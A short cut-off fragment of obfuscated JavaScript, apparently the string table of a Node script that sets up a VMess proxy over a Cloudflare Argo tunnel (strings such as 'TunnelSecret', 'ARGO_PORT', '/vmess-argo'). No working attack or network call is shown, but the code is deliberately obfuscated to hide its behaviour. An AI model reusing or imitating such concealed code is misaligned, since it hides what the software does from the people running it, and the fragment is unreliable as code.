xpress','substring','TunnelSecret','ARGO_PORT','floor','readFileSync','2083','/vmess-argo','block','base64','test'];_0x56b8=function(){return _0x473c00;};return _0x56b8();}
